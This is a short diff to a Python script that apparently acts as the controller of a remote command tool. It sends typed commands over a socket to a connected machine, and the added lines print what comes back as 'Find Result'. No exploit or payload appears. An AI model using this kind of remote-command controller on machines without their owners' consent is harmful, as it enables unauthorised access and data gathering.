@@ -43,8 +43,14 @@ while 1:
         print("")
         user_input = input(str("CustomD1R: "))
         conn.send(user_input.encode())
+        print("")
         print("Command has been sent")
         print("")
+        files = conn.recv(5000)
+        files = files.decode()
+        print("CustomD1R Find Result: ", files)
+
+
 
     else:
         print("")
